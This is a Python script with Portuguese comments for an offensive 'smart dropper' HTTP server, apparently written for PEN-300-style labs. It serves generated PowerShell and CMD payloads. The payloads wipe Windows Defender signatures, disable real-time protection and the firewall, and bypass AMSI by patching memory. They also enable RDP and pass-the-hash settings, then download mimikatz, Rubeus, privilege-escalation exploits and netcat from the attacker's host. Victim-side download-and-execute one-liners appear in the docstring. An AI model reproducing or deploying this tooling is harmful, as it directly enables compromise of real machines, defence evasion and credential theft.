"""
===============================================================================
SMART DROPper SERVER (Multi-Interface Aware HTTP Server)
===============================================================================

Descrição:
-----------
Servidor HTTP customizado para uso em labs ofensivos (ex: PEN-300) que:

- Escuta em todas as interfaces (0.0.0.0)
- Detecta automaticamente o IP local usado na conexão
- Gera droppers dinamicamente (PowerShell e CMD)
- Evita hardcode de IP (funciona com múltiplas redes/interfaces)
- Serve arquivos da pasta definida no argumento

-------------------------------------------------------------------------------

Funcionalidades:
----------------
- Endpoint único para dropper: /dropper
- Endpoint alternativo CMD: /cmd
- Substituição automática de {{KALI_IP}} no template
- Servidor de arquivos estáticos (binários, scripts, etc.)
- Compatível com múltiplas interfaces (tun0, eth0, etc.)

-------------------------------------------------------------------------------

Uso:
-----

# Executar servidor:
sudo python3 smart_server.py /opt/tools

# Ou com alias:
dropper

-------------------------------------------------------------------------------

Exemplos de uso na vítima:
--------------------------

# PowerShell (recomendado - execução em memória):
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/dropper')"

# CMD (fallback):
certutil -urlcache -split -f http://IP/cmd C:\\Users\\Public\\dropper.cmd; C:\\Users\\Public\\dropper.cmd

-------------------------------------------------------------------------------

Observações importantes:
------------------------

- Requer privilégios elevados para rodar na porta 80
- PowerShell é preferível ao CMD (menos ruído e mais confiável)
- Evitar diretórios protegidos no Windows (usar C:\\Users\\Public ou %TEMP%)
- O IP é resolvido automaticamente com base na interface da conexão

===============================================================================
"""

#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
import sys

PORT = 80

BASE_DIR = Path(sys.argv[1]).resolve() if len(sys.argv) > 1 else Path(".").resolve()


PRE_PS1 = r'''

Write-Host "[+] Preparando ambiente"

# Ajustes de segurança do host


try {
        Write-Host "[+] Aplicando ajustes de segurança"

        Write-Host "[+] Limpando assinaturas do Defender"  
                if (Test-Path "C:\Program Files\Windows Defender\MpCmdRun.exe") {  
                        & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All  
                        }

        Write-Host "[+] Desabilitando antivirus..."
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue  
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue  
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue  
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue  
        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue  
        Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue
        Set-MpPreference -DisableAutoExclusions $true -ErrorAction SilentlyContinue

        Write-Host "[+] Desabilitando o firewall"
        NetSh Advfirewall set allprofiles state off | Out-Null

        Write-Host "[+] Status Defender"  
        Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableScriptScanning, DisableBehaviorMonitoring, DisableIOAVProtection  

        Write-Host "[+] Status Firewall"  
        netsh advfirewall show allprofiles state

        }
catch {
        Write-Host "[ERRO] Falha nos ajustes de segurança: $($_.Exception.Message)"
}



Write-Host "[+] Desativando AMSI..."
try {
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

}
catch {
        Write-Host "[ERRO] Falha nos ajustes do AMSI: $($_.Exception.Message)"
}



# Ajustes de acesso remoto
try {
    Write-Host "[+] Aplicando ajustes de acesso remoto"

        Write-Host "[+] Habilitando Restricted Admin para RDP/PTH"
        New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWord -Force | Out-Null

        Write-Host "[+] Habilitando acesso remoto para contas locais admin"
        New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force | Out-Null

        Write-Host "[+] Habilitando RDP"
        Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0


        # netsh firewall add portopening TCP 3389 "Remote Desktop"
        netsh advfirewall firewall set rule group="remote desktop" new enable=Yes | Out-Null  
        netsh advfirewall firewall add rule name="Remote Desktop 3389" dir=in action=allow protocol=TCP localport=3389 | Out-Null

        Write-Host "[+] Iniciando serviço TermService"  
        Start-Service TermService -ErrorAction SilentlyContinue

        Write-Host "[+] Verificando porta 3389"  
        netstat -ano | findstr ":3389"

}
catch {
        Write-Host "[ERRO] Falha nos ajustes de acesso remoto: $($_.Exception.Message)"
}

Write-Host "[+] Ambiente pronto"

'''

PRE_CMD = r'''
echo [+] Preparando ambiente...

C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinitions -All


echo [+] Ambiente OK
'''


FILES = [
    "agent_windows.exe",
    "busybox.exe",
    "GodPotato-NET4.exe",
    "mimikatz64.exe",
    "mimidrv.sys",
    "Powermad.ps1",
    "PowerUp.ps1",
    "PowerView.ps1",
    "PrintSpoofer64.exe",
    "Rubeus.exe",
    "SharpHound.exe",
    "SharpHound.ps1",
    "SpoolSample.exe",
    "winPEASany.exe",
    "winPEAS.ps1",
    "nc.exe",
    "Hollow.exe",
]

PS1_TEMPLATE = r'''
$baseUrl = "http://{{KALI_IP}}"
$dest = "C:\Windows\Tasks"

{{PRE_PS1}}

$files = @(
{{FILES_PS}}
)

$wc = New-Object Net.WebClient

foreach ($file in $files) {
    $url = "$baseUrl/$file"
    $out = "$dest\$file"

    Write-Host "[+] Baixando $file de $url"

    try {
        $wc.DownloadFile($url, $out)

        if (Test-Path $out) {
            Write-Host "[OK] $file"
        } else {
            Write-Host "[ERRO] Falha ao baixar $file"
        }
    } catch {
        Write-Host "[FALHA] $file -> $($_.Exception.Message)"
    }
}
'''

CMD_TEMPLATE = r'''
@echo off
set BASEURL=http://{{KALI_IP}}
set DEST=C:\Windows\Tasks

{{PRE_CMD}}

{{FILES_CMD}}

echo [OK] Downloads finalizados.
'''

class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(BASE_DIR), **kwargs)

    def render_ps1(self, kali_ip):
        files_ps = ",\n".join([f'    "{f}"' for f in FILES])
        return (
            PS1_TEMPLATE
            .replace("{{KALI_IP}}", kali_ip)
            .replace("{{FILES_PS}}", files_ps)
            .replace("{{PRE_PS1}}", PRE_PS1)
        )
    
    def evade(self, kali_ip):
        files_ps = ",\n".join([f'    "{f}"' for f in FILES])
        return (
            PS1_TEMPLATE
            .replace("{{KALI_IP}}", kali_ip)
            .replace("{{FILES_PS}}", "")
            .replace("{{PRE_PS1}}", PRE_PS1)
        )

    def render_cmd(self, kali_ip):
        files_cmd = "\n".join([
            f'certutil -urlcache -split -f %BASEURL%/{f} %DEST%\\{f}'
            for f in FILES
        ])
        return (
            CMD_TEMPLATE
            .replace("{{KALI_IP}}", kali_ip)
            .replace("{{FILES_CMD}}", files_cmd)
            .replace("{{PRE_CMD}}", PRE_CMD)
        )

    def send_text(self, content, content_type="text/plain"):
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.end_headers()
        self.wfile.write(content.encode("utf-8"))

    def do_GET(self):
        kali_ip = self.connection.getsockname()[0]

        if self.path in ["/dropper", "/dropper_ps1.ps1", "/ps1"]:
            content = self.render_ps1(kali_ip)
            print(f"[+] Served PS1 to {self.client_address[0]} using {kali_ip}")
            self.send_text(content)
            return
        
        if self.path in ["/evade"]:
            content = self.evade(kali_ip)
            print(f"[+] Served CMD to {self.client_address[0]} using {kali_ip}")
            self.send_text(content)
            return

        if self.path in ["/dropper_cmd.cmd", "/cmd"]:
            content = self.render_cmd(kali_ip)
            print(f"[+] Served CMD to {self.client_address[0]} using {kali_ip}")
            self.send_text(content)
            return

        return super().do_GET()

if __name__ == "__main__":
    print(f"[+] Servindo arquivos de: {BASE_DIR}")
    print(f"[+] Servidor rodando em 0.0.0.0:{PORT}")

    server = HTTPServer(("0.0.0.0", PORT), Handler)
    server.serve_forever()
